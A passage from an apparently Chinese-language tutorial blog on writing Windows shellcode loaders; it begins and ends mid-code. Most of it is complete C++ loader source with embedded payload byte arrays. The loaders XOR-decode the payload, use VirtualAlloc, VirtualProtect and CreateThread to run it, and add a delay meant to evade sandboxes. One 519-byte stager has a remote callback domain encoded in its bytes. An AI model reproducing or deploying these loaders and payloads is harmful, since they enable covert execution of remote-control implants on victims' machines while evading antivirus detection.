class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现一次混淆加载"><a href="#实现一次混淆加载" class="headerlink" title="实现一次混淆加载"></a>实现一次混淆加载</h2><p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第三课"><a href="#第三课" class="headerlink" title="第三课"></a>第三课</h1><h2 id="内存申请的优化"><a href="#内存申请的优化" class="headerlink" title="内存申请的优化"></a>内存申请的优化</h2><p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    buf[i] ^= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p><code>InterlockedXorRelease</code>函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x